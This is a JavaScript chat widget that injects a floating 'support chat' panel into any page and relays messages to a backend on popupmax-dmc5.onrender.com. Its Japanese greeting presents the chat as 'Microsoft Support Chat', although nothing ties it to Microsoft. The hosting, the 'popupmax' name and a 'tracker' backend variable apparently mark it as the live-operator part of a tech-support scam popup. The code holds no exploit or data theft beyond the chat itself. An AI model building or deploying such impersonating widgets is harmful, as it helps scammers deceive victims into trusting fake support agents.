/**
 * chat-widget.js — drop this on any frontend page.
 *
 * Usage:
 *   <script src="https://popupmax-dmc5.onrender.com/chat-widget.js"></script>
 *
 * Override backend:
 *   <script>window.__CHAT_BACKEND__ = "https://other.com";</script>
 */
(function () {
  var BACKEND = ((window.__CHAT_BACKEND__ || window.__TRACKER_BACKEND__ || "https://popupmax-dmc5.onrender.com")).replace(/\/$/, "");

  // ── ✏️  EDIT YOUR TEXT HERE ─────────────────────────────────────
  // Set window.__CHAT_LOGO__ = "https://files-pop.s3.ap-northeast-1.amazonaws.com/msmm.png" before this script to show a logo
  var LOGO            = window.__CHAT_LOGO__ || "";

  var TEXT_BTN_LABEL  = "チャットを始める";        // floating button label
  var TEXT_TITLE      = "サポートチャット";          // header title inside chatbox
  var TEXT_SUBTITLE   = "お気軽にご連絡ください";    // header subtitle inside chatbox
  var TEXT_GREETING   = "👋 マイクロソフトサポートチャットへようこそ。メッセージをご記入ください。"; // first greeting message
  var TEXT_PLACEHOLDER = "メッセージを入力…";        // input placeholder
  var TEXT_ONLINE     = "オンライン・すぐにご返答します"; // status when connected
  var TEXT_CONNECTING = "接続中…";                  // status while connecting
  // ────────────────────────────────────────────────────────────────

  // ── Inject styles ───────────────────────────────────────────────
  var style = document.createElement("style");
  style.textContent = [
    "#cw-btn{position:fixed;bottom:32px;right:28px;height:52px;border-radius:26px;",
    "background:#3b82f6;color:#fff;border:none;cursor:pointer;font-size:20px;",
    "display:flex;align-items:center;gap:8px;padding:0 20px 0 16px;white-space:nowrap;",
    "box-shadow:0 4px 20px rgba(0,0,0,.3);z-index:250000;transition:transform .2s,background .2s;}",
    "#cw-btn:hover{background:#2563eb;transform:scale(1.04);}",
    "#cw-btn-label{font-size:14px;font-weight:600;letter-spacing:.2px;}",
    "#cw-badge{position:absolute;top:-3px;right:-3px;background:#ef4444;color:#fff;",
    "border-radius:50%;min-width:18px;height:18px;font-size:10px;font-weight:700;",
    "display:none;align-items:center;justify-content:center;padding:0 3px;}",

    "#cw-panel{position:fixed;bottom:96px;right:28px;width:360px;height:520px;",
    "background:#fff;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,.22);",
    "display:none;flex-direction:column;overflow:hidden;z-index:249999;",
    "font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px;}",
    "#cw-panel.open{display:flex;}",

    "#cw-head{background:#3b82f6;color:#fff;padding:14px 16px;display:flex;",
    "align-items:center;justify-content:space-between;flex-shrink:0;}",
    "#cw-head-info{display:flex;align-items:center;gap:10px;}",
    ".cw-av{width:38px;height:38px;border-radius:50%;background:rgba(255,255,255,.22);",
    "display:flex;align-items:center;justify-content:center;}",
    ".cw-av-wrap{position:relative;flex-shrink:0;}",
    ".cw-av-wrap .cw-live-dot{position:absolute;bottom:1px;right:1px;}",
    ".cw-live-dot{display:inline-block;width:9px;height:9px;border-radius:50%;",
    "background:#22c55e;border:2px solid rgba(59,130,246,1);flex-shrink:0;",
    "box-shadow:0 0 0 0 rgba(34,197,94,.5);animation:cwlivepulse 1.6s infinite;}",
    "@keyframes cwlivepulse{0%{box-shadow:0 0 0 0 rgba(34,197,94,.6)}",
    "70%{box-shadow:0 0 0 7px rgba(34,197,94,0)}100%{box-shadow:0 0 0 0 rgba(34,197,94,0)}}",
    "#cw-head-title{font-weight:600;font-size:15px;line-height:1.2;",
    "display:flex;align-items:center;gap:6px;}",
    "#cw-head-sub{font-size:11px;opacity:.82;}",
    "#cw-x{background:none;border:none;color:#fff;font-size:22px;cursor:pointer;",
    "opacity:.75;line-height:1;padding:0;}#cw-x:hover{opacity:1;}",

    "#cw-msgs{flex:1;overflow-y:auto;padding:14px 12px;display:flex;",
    "flex-direction:column;gap:8px;background:#f8fafc;}",
    ".cw-m{max-width:78%;padding:9px 12px;border-radius:16px;line-height:1.45;",
    "word-break:break-word;font-size:13px;animation:cwfade .15s ease;}",
    "@keyframes cwfade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}",
    ".cw-m.user{align-self:flex-end;background:#3b82f6;color:#fff;border-bottom-right-radius:4px;}",
    ".cw-m.admin{align-self:flex-start;background:#fff;color:#1e293b;",
    "border-bottom-left-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.08);}",
    ".cw-mt{font-size:10px;opacity:.5;margin-top:3px;text-align:right;}",
    ".cw-m.user .cw-mt{text-align:right;}.cw-m.admin .cw-mt{text-align:left;}",

    "#cw-typing{align-self:flex-start;background:#fff;padding:9px 14px;border-radius:16px;",
    "border-bottom-left-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.08);",
    "font-size:13px;color:#94a3b8;display:none;}",
    "#cw-typing.show{display:block;}",
    ".cw-dots span{display:inline-block;width:5px;height:5px;border-radius:50%;",
    "background:#94a3b8;margin:0 1px;animation:cwdot 1.2s infinite ease-in-out;}",
    ".cw-dots span:nth-child(2){animation-delay:.2s;}",
    ".cw-dots span:nth-child(3){animation-delay:.4s;}",
    "@keyframes cwdot{0%,80%,100%{transform:scale(.7);opacity:.5}40%{transform:scale(1);opacity:1}}",

    "#cw-foot{padding:10px 12px;border-top:1px solid #e2e8f0;display:flex;gap:8px;",
    "background:#fff;flex-shrink:0;align-items:flex-end;}",
    "#cw-in{flex:1;border:1px solid #e2e8f0;border-radius:20px;padding:8px 13px;",
    "font-size:13px;outline:none;resize:none;font-family:inherit;line-height:1.4;",
    "max-height:80px;overflow-y:auto;}",
    "#cw-in:focus{border-color:#3b82f6;}",
    "#cw-sb{background:#3b82f6;color:#fff;border:none;border-radius:50%;",
    "width:36px;height:36px;cursor:pointer;font-size:15px;flex-shrink:0;",
    "display:flex;align-items:center;justify-content:center;transition:background .15s;}",
    "#cw-sb:hover{background:#2563eb;}#cw-sb:disabled{background:#cbd5e1;cursor:not-allowed;}"
  ].join("");
  document.head.appendChild(style);

  // ── Inject HTML ─────────────────────────────────────────────────
  // Support headset SVG icon
  var supportIcon =
    '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">' +
      '<path d="M3 18v-6a9 9 0 0 1 18 0v6"/>' +
      '<path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3z"/>' +
      '<path d="M3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z"/>' +
    '</svg>';

  // Avatar area in header: logo if set, otherwise support icon with live dot
  var avatarHTML = LOGO
    ? '<div class="cw-av-wrap"><img src="' + LOGO + '" style="width:38px;height:38px;border-radius:50%;object-fit:cover;" alt="logo" /><span class="cw-live-dot"></span></div>'
    : '<div class="cw-av-wrap"><div class="cw-av">' + supportIcon + '</div><span class="cw-live-dot"></span></div>';

  var wrap = document.createElement("div");
  wrap.innerHTML =
    '<button id="cw-btn" aria-label="' + TEXT_BTN_LABEL + '">' +
      '<span style="display:flex;align-items:center;">' + supportIcon + '</span>' +
      '<span id="cw-btn-label">' + TEXT_BTN_LABEL + '</span>' +
      '<span id="cw-badge"></span>' +
    '</button>' +
    '<div id="cw-panel" role="dialog">' +
      '<div id="cw-head">' +
        '<div id="cw-head-info">' +
          avatarHTML +
          '<div>' +
            '<div id="cw-head-title">' + TEXT_TITLE + '<span class="cw-live-dot" style="border-color:rgba(255,255,255,.3)"></span></div>' +
            '<div id="cw-head-sub">' + TEXT_SUBTITLE + '</div>' +
          '</div>' +
        '</div>' +
        '<button id="cw-x" aria-label="閉じる">×</button>' +
      '</div>' +
      '<div id="cw-msgs">' +
        '<div class="cw-m admin"><div>' + TEXT_GREETING + '</div>' +
        '<div class="cw-mt">support</div></div>' +
        '<div id="cw-typing"><div class="cw-dots"><span></span><span></span><span></span></div></div>' +
      '</div>' +
      '<div id="cw-foot">' +
        '<textarea id="cw-in" placeholder="' + TEXT_PLACEHOLDER + '" rows="1"></textarea>' +
        '<button id="cw-sb" aria-label="送信">&#10148;</button>' +
      '</div>' +
    '</div>';
  document.body.appendChild(wrap);

  // ── Refs ────────────────────────────────────────────────────────
  var btn      = document.getElementById("cw-btn");
  var panel    = document.getElementById("cw-panel");
  var msgsList = document.getElementById("cw-msgs");
  var typingEl = document.getElementById("cw-typing");
  var input    = document.getElementById("cw-in");
  var sendBtn  = document.getElementById("cw-sb");
  var badge    = document.getElementById("cw-badge");
  var headSub  = document.getElementById("cw-head-sub");

  // ── State ────────────────────────────────────────────────────────
  var isOpen        = false;
  var unreadCount   = 0;
  var typingTimeout = null;
  var typeDebounce  = null;
  var sseConn       = null;
  var localMsgs     = [];

  try { localMsgs = JSON.parse(localStorage.getItem("_cw_msgs") || "[]"); } catch (_) {}

  // Restore history from localStorage
  if (localMsgs.length) {
    // Clear default greeting before restoring real history
    msgsList.innerHTML = '<div id="cw-typing"><div class="cw-dots"><span></span><span></span><span></span></div></div>';
    typingEl = document.getElementById("cw-typing");
    localMsgs.forEach(function (m) { renderMsg(m); });
  }

  // ── SSE ─────────────────────────────────────────────────────────
  function connectSSE() {
    if (sseConn) sseConn.close();
    try {
      sseConn = new EventSource(BACKEND + "/chat/stream/user");

      sseConn.addEventListener("message", function (e) {
        var d = JSON.parse(e.data);
        renderMsg(d.message, true);
        if (!isOpen) bumpUnread();
      });

      sseConn.addEventListener("typing", function () {
        typingEl.classList.add("show");
        scrollBottom();
        clearTimeout(typingTimeout);
        typingTimeout = setTimeout(function () { typingEl.classList.remove("show"); }, 3000);
      });

      sseConn.addEventListener("error", function () {
        sseConn.close();
        setTimeout(connectSSE, 6000);
      });
    } catch (_) {}
  }
  connectSSE();

  // ── Render a message bubble ─────────────────────────────────────
  function renderMsg(msg, save) {
    var el = document.createElement("div");
    el.className = "cw-m " + (msg.role === "admin" ? "admin" : "user");
    var t = new Date(Number(msg.timestamp));
    var time = t.getHours().toString().padStart(2, "0") + ":" + t.getMinutes().toString().padStart(2, "0");
    el.innerHTML = "<div>" + escHtml(msg.text) + "</div><div class='cw-mt'>" + time + "</div>";
    msgsList.insertBefore(el, typingEl);
    scrollBottom();
    if (save) {
      localMsgs.push({ role: msg.role, text: msg.text, timestamp: msg.timestamp });
      if (localMsgs.length > 60) localMsgs = localMsgs.slice(-60);
      try { localStorage.setItem("_cw_msgs", JSON.stringify(localMsgs)); } catch (_) {}
    }
  }

  function scrollBottom() {
    msgsList.scrollTop = msgsList.scrollHeight;
  }

  function escHtml(s) {
    return String(s || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\n/g, "<br>");
  }

  // ── Badge ────────────────────────────────────────────────────────
  function bumpUnread() {
    unreadCount++;
    badge.textContent = unreadCount > 9 ? "9+" : unreadCount;
    badge.style.display = "flex";
  }
  function clearUnread() {
    unreadCount = 0;
    badge.style.display = "none";
  }

  // ── Send ─────────────────────────────────────────────────────────
  function sendMsg() {
    var text = input.value.trim();
    if (!text) return;
    sendBtn.disabled = true;
    input.value = "";
    input.style.height = "auto";

    var msg = { role: "user", text: text, timestamp: Date.now() };
    renderMsg(msg, true);

    fetch(BACKEND + "/chat/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message: text }),
    })
      .then(function () { sendBtn.disabled = false; })
      .catch(function () { sendBtn.disabled = false; });
  }

  // ── Typing detection ─────────────────────────────────────────────
  input.addEventListener("input", function () {
    this.style.height = "auto";
    this.style.height = Math.min(this.scrollHeight, 80) + "px";
    clearTimeout(typeDebounce);
    typeDebounce = setTimeout(function () {
      fetch(BACKEND + "/chat/typing", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: "{}",
        keepalive: true,
      }).catch(function () {});
    }, 400);
  });

  input.addEventListener("keydown", function (e) {
    if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); sendMsg(); }
  });

  sendBtn.addEventListener("click", sendMsg);

  // ── Toggle open/close ─────────────────────────────────────────────
  function openPanel() {
    isOpen = true;
    panel.classList.add("open");
    clearUnread();
    scrollBottom();
    input.focus();
    btn.innerHTML = '<span style="font-size:22px;line-height:1">×</span><span id="cw-badge"></span>';
    badge = document.getElementById("cw-badge");
  }

  function closePanel() {
    isOpen = false;
    panel.classList.remove("open");
    btn.innerHTML = '<span style="display:flex;align-items:center;">' + supportIcon + '</span><span id="cw-btn-label">' + TEXT_BTN_LABEL + '</span><span id="cw-badge"></span>';
    badge = document.getElementById("cw-badge");
    if (unreadCount) bumpUnread();
  }

  btn.addEventListener("click", function () { isOpen ? closePanel() : openPanel(); });
  document.getElementById("cw-x").addEventListener("click", closePanel);

  // ── Online status hint ────────────────────────────────────────────
  // Pulse the subtitle while SSE is connected so user knows it's live
  setInterval(function () {
    if (sseConn && sseConn.readyState === 1) {
      headSub.textContent = TEXT_ONLINE;
    } else {
      headSub.textContent = TEXT_CONNECTING;
    }
  }, 3000);
})();